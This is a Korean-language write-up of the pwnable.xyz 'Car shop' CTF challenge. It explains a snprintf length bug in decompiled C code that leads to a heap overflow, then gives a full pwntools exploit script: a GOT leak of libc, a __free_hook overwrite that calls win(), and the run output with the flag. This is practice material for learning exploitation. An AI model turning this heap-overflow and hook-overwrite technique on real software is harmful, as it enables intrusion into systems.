# [pwnable.xyz] Car shop

:writing_hand: [h0meb0dy](mailto:h0meb0dysj@gmail.com)

> Which brand would you choose?
>
> Release: [Car shop.zip](https://github.com/h0meb0dy/pwnable.xyz/files/9145580/Car.shop.zip)

## Mitigation

![image](https://user-images.githubusercontent.com/104156058/179872528-b8cdbc6a-3b77-497c-a9ed-b079e0e44f16.png)

## Analysis

### `win()`

```c
int win()
{
  return system("cat flag");
}
```

`win()`이 실행되도록 하면 플래그를 획득할 수 있다.

### `struct car`

![image](https://user-images.githubusercontent.com/104156058/179876441-f17dd150-0e33-4732-8f9f-0be3a6fdbc46.png)

- `name`: 차 이름
- `nameLen`: 차 이름의 길이
- `next`: double linked list에서 다음 차를 가리키는 포인터
- `prev`: double linked list에서 이전 차를 가리키는 포인터

### `main()`

#### 1. Buy a car

```c
      case 1u:
        buy();
        break;
```

#### `buy()`

```c
  puts("Which car would you like to buy?");
  for ( i = 0; i <= 9; ++i )
    printf("%d: %s\n", i, makes[i]);
  printf("> ");
  idx = readint();
  if ( idx >= 10 )
    return puts("Invalid");
```

어떤 차를 살지 선택할 수 있다.

```c
  car = (car *)malloc(0x20uLL);
  car->name = (char *)malloc(0x10uLL);
  car->nameLen = snprintf(car->name, 0x10uLL, "%s", makes[idx]);
```

선택한 차의 이름을 저장한다.

```c
  car->next = 0LL;
  car->prev = 0LL;
  if ( Head )
  {
    for ( ptr = Head; ptr->next; ptr = ptr->next )
      ;
    ptr->next = car;
    result = (int)car;
    car->prev = ptr;
  }
  else
  {
    result = (int)car;
    Head = car;
  }
```

Linked list에 구매한 차를 추가한다.

#### 2. Sell a car

```c
      case 2u:
        sell();
        break;
```

#### `sell()`

```c
    printf("Which car would you like to sell: ");
    name = (char *)readline();
```

판매할 차의 이름을 입력받는다.

```c
    for ( s = Head; s; s = s->next )
    {
      if ( !strcmp(s->name, name) )
      {
        if ( s->prev )
          s->prev->next = s->next;
        if ( s->next )
          s->next->prev = s->prev;
        if ( s == Head )
        {
          Head = s->next;
          if ( Head )
            Head->prev = 0LL;
        }
        memset(s->name, 0, s->nameLen);
        memset(s, 0, sizeof(car));
        free(s->name);
        free(s);
      }
    }
    free(name);
  }
  else
  {
    puts("No cars");
  }
```

Linked list에서 입력한 이름을 가진 차를 찾는다. 찾으면 그 차를 리스트에서 제거하고 메모리를 해제한다.

#### 3. Re-model

```c
      case 3u:
        remodel();
        break;
```

#### `remodel()`

```c
  printf("Which car would you like to remodel: ");
  name = readline();
```

리모델링할 차의 이름을 입력받는다.

```c
  for ( i = Head; i; i = i->next )
  {
    if ( !strcmp(i->name, name) )
    {
      printf("Name your new model: ");
      newName = readline();
      i->nameLen = snprintf(i->name, i->nameLen, "%s", newName);
      free(newName);
      break;
    }
  }
  free(name);
```

Linked list에서 입력한 이름을 가진 차를 찾는다. 찾으면 저장된 `nameLen`만큼 새로운 이름을 입력받고 저장한다.

#### 4. List cars

```c
      case 4u:
        list();
        break;
```

### `list()`

```c
car *list()
{
  car *result; // rax
  car *i; // [rsp+8h] [rbp-10h]

  puts("Car collection:");
  result = Head;
  for ( i = Head; i; i = result )
  {
    printf(&byte_40117B, i->name);
    result = i->next;
  }
  return result;
}
```

`Head`부터 시작해서 linked list에 있는 모든 차들을 출력한다.

## Exploit

```c
char *__fastcall readline()
{
  char buf; // [rsp+7h] [rbp-21h] BYREF
  void *ptr; // [rsp+8h] [rbp-20h]
  __int64 len; // [rsp+10h] [rbp-18h]
  unsigned __int64 v4; // [rsp+18h] [rbp-10h]

  v4 = __readfsqword(0x28u);
  ptr = malloc(0x20uLL);
  len = 0LL;
  while ( read(0, &buf, 1uLL) != -1 && buf != '\n' )
  {
    if ( (++len & 0x1F) == 0 )
      ptr = realloc(ptr, len + 0x20);
    *((_BYTE *)ptr + len - 1) = buf;
  }
  *((_BYTE *)ptr + len) = 0;
  return (char *)ptr;
}
```

`remodel()`에서 `nameLen`에 `snprintf()`의 반환값을 넣는데, `snprintf()`는 dest에 복사된 문자열의 길이가 아니라 복사할 src의 문자열의 길이를 반환한다. 따라서 `nameLen`을 원하는 값으로 조작할 수 있다.

![image](https://user-images.githubusercontent.com/104156058/179881170-f2f87afa-d06a-4185-b23c-182f99f3328f.png)

이 상태에서 `remodel()`을 한 번 더 실행하면 다음 차의 `name`을 덮어쓸 수 있다.

먼저 `name`을 함수의 GOT 주소로 덮어서 libc 주소를 leak하고, 그 다음에는 hook의 주소로 덮어서 hook overwrite로 `win()`을 호출하면 플래그를 획득할 수 있다.

### Full exploit

```python
from pwn import *

LOCAL = False

if LOCAL:
    r = process('./release/challenge')
    atoi_offset = 0x36e90
    freehook_offset = 0x3c67a8
    binsh_offset = 0x18ce57
else:
    r = remote('svc.pwnable.xyz', 30037)
    atoi_offset = 0x34240
    freehook_offset = 0x3987c8
    binsh_offset = 0x15fdca

sla = r.sendlineafter

def buy(idx):
    sla('> ', '1')
    sla('> ', str(idx))

def sell(car):
    sla('> ', '2')
    sla('> ', car)

def remodel(old, new):
    sla('> ', '3')
    sla('Which car would you like to remodel: ', old)
    sla('Name your new model: ', new)

def list_cars():
    sla('> ', '4')

win = 0x400b4e # win()
atoi_got = 0x601ff0 # GOT address of atoi()


# libc leak

buy(0) # BMW
buy(1) # Lexus

remodel('BMW', 'a' * 0x28)
remodel('aa', b'a' * 0x20 + p64(atoi_got))

list_cars()

r.recvuntil('🚗: ')
r.recvuntil('🚗: ')

atoi = u64(r.recvline()[:-1].ljust(8, b'\x00')) # atoi()
libc = atoi - atoi_offset # libc base
log.info('libc base: ' + hex(libc))
freehook = libc + freehook_offset # __free_hook
binsh = libc + binsh_offset # "/bin/sh"


# free hook overwrite -> win()

remodel(b'a' * 0x20 + p64(atoi_got), 'a' * 0x28)
remodel('a' * 0x22, b'a' * 0x20 + p64(freehook))
remodel('\x00', p64(win))


r.interactive()
```

```
$ python3 ex.py
[+] Opening connection to svc.pwnable.xyz on port 30037: Done
[*] libc base: 0x7f6288abc000
[*] Switching to interactive mode
FLAG{that_was_a_tricky_one_wasnt_it}FLAG{that_was_a_tricky_one_wasnt_it}
```